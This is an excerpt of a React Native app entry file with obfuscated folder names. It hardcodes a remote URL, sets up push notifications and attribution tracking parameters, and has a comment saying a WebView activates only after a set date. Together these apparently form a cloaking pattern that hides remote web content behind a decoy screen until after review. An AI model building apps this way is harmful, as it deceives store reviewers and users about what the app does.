...
import DecisionPathChancePodScr from './jxwoencwnevwrne/screens/DecisionPathChancePodScr';
...
const App = () => {
      ...
      const INITIAL_URL = `https://magnificent-lordly-serenity.com/`;
      const URL_IDENTIFAIRE = `Hk1rx3PJ`;
      ...
      OneSignal.initialize('de4e93da-4cd0-4b97-a46a-eac3b7cff8a0');
      ...
      useEffect(() => {
            ...
            const targetData = new Date('2025-06-23T13:00:00'); //дата з якої поч працювати webView
      ...
      const generateLink = async () => {
            try {
                  ...
                  if (sab1) {
                        ...
                        //);
                        // Якщо sab1 undefined або пустий, встановлюємо subId1=atribParam
                        additionalParams = `${atribParam ? `subId1=${atribParam}` : ''}&checkData=${checkAsaData}`;
                  }
                  ...
                  return (
                        <Stack.Navigator>
                              <Stack.Screen
                                    ...
                                    name="DecisionPathChancePodScr"
                                    component={DecisionPathChancePodScr}
            ...
            <NavigationContainer>
                  {!louderIsEnded || !aceptTransperency || !completeLink ? (
                        <View
                              ...
                              <Animated.Image
                                    source={require('./jxwoencwnevwrne/alkmmdwmwem/loader.png')}
                                    style={{
                                          //...props.style,
